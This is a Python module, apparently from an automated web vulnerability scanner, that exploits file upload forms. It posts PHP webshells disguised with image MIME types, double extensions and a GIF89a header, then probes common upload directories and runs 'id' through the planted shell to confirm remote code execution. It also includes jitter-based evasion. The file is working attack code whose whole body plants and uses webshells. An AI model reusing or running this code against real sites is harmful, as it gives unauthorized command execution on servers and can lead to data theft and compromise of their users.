"""
modules/vulns/file_upload.py - File Upload Exploitation

Finds upload forms, uploads webshells, verifies RCE.
"""
import asyncio
import logging
import re
from urllib.parse import urlparse, urljoin
from core.finding import Finding
from core.http_client import make_client, PROBE_TIMEOUT
from core.evasion import maybe_jitter

logger = logging.getLogger(__name__)

PHP_SHELL = b"<?php system($_GET['c']); ?>"

SHELLS = [
    ("shell.php",     b"<?php system($_GET['c']); ?>", "image/jpeg"),
    ("shell.php.jpg", b"<?php system($_GET['c']); ?>", "image/jpeg"),
    ("shell.phtml",   b"<?php system($_GET['c']); ?>", "image/jpeg"),
    ("shell.php5",    b"<?php system($_GET['c']); ?>", "image/jpeg"),
    ("shell.gif",     b"GIF89a<?php system($_GET['c']); ?>", "image/gif"),
]

UPLOAD_PATHS = ["/uploads/", "/upload/", "/files/", "/media/", "/images/", "/assets/"]
RCE_IND = ["uid=", "gid=", "root", "www-data", "apache", "nobody"]
UPLOAD_KW = ["file", "upload", "image", "avatar", "photo", "attachment", "document"]


class FileUpload:
    async def run(self, ctx: dict) -> list[Finding]:
        findings = []
        forms    = ctx.get("forms", [])
        target   = ctx.get("target_url", "")
        limiter  = ctx["limiter"]
        verifier = ctx.get("verifier")
        sem      = asyncio.Semaphore(3)

        upload_forms = [
            f for f in forms
            if (f.get("enctype", "").lower() == "multipart/form-data"
                or any(kw in str(f.get("inputs", [])).lower() for kw in UPLOAD_KW))
        ]

        async def probe(form):
            f = await self._probe_form(form, limiter, sem, verifier, target)
            if f:
                findings.append(f)

        await asyncio.gather(*[probe(f) for f in upload_forms[:8]])
        logger.info(f"FileUpload completed - {len(findings)} finding(s)")
        return findings

    async def _probe_form(self, form, limiter, sem, verifier, base_url) -> Finding | None:
        action = form.get("action", "")
        inputs = form.get("inputs", [])
        if not action:
            return None
        file_fields = [i for i in inputs if any(kw in i.lower() for kw in UPLOAD_KW)]
        if not file_fields:
            file_fields = ["file"]

        async with sem:
            for fname, content, ctype in SHELLS[:4]:
                try:
                    await maybe_jitter()
                    files = {file_fields[0]: (fname, content, ctype)}
                    data  = {i: "test" for i in inputs if i not in file_fields}
                    async with limiter.acquire():
                        async with make_client(timeout=PROBE_TIMEOUT) as c:
                            r = await c.post(action, files=files, data=data)
                    upload_url = self._extract_url(r.text, base_url)
                    if not upload_url:
                        for path in UPLOAD_PATHS[:4]:
                            test = urljoin(base_url, path + fname)
                            if await self._accessible(test, limiter):
                                upload_url = test
                                break
                    if upload_url:
                        rce = await self._try_rce(upload_url + "?c=id", limiter)
                        if rce:
                            finding = Finding(
                                title="File Upload RCE: " + fname + " at " + upload_url,
                                severity="Critical",
                                description="Uploaded webshell achieved RCE. Output: " + rce[:80],
                                affected_url=upload_url,
                                proof="POST " + action + "\nUploaded: " + fname + "\nRCE: " + rce[:200],
                                remediation="Validate file types. Store outside web root. Never execute uploads.",
                                impact=5, likelihood=5, module="FileUpload",
                                cvss_score=10.0, cwe="CWE-434",
                            )
                            if verifier and verifier.available:
                                try:
                                    ok, shot = await verifier.verify_sqli(upload_url + "?c=id")
                                    if ok:
                                        finding.verified = True
                                        finding.screenshot = shot
                                except Exception:
                                    pass
                            return finding
                        return Finding(
                            title="Unrestricted File Upload: " + fname + " accessible",
                            severity="High",
                            description="Uploaded " + fname + " is accessible at " + upload_url,
                            affected_url=upload_url,
                            proof="POST " + action + "\nFile at: " + upload_url,
                            remediation="Validate uploads, randomise names, store outside web root.",
                            impact=4, likelihood=4, module="FileUpload",
                            cvss_score=8.8, cwe="CWE-434",
                        )
                except Exception as e:
                    logger.debug("FileUpload " + action + " [" + fname + "]: " + str(e))
        return None

    def _extract_url(self, body, base_url):
        m = re.search(r'["\'](/[^"\'>\s]+\.(?:php|asp|aspx|jsp|phtml))', body)
        return urljoin(base_url, m.group(1)) if m else None

    async def _accessible(self, url, limiter):
        try:
            async with limiter.acquire():
                async with make_client(timeout=PROBE_TIMEOUT) as c:
                    r = await c.get(url)
            return r.status_code == 200
        except Exception:
            return False

    async def _try_rce(self, url, limiter):
        try:
            async with limiter.acquire():
                async with make_client(timeout=PROBE_TIMEOUT) as c:
                    r = await c.get(url)
            for ind in RCE_IND:
                if ind in r.text:
                    idx = r.text.find(ind)
                    return r.text[max(0, idx - 5):idx + 100].strip()
        except Exception:
            pass
        return None
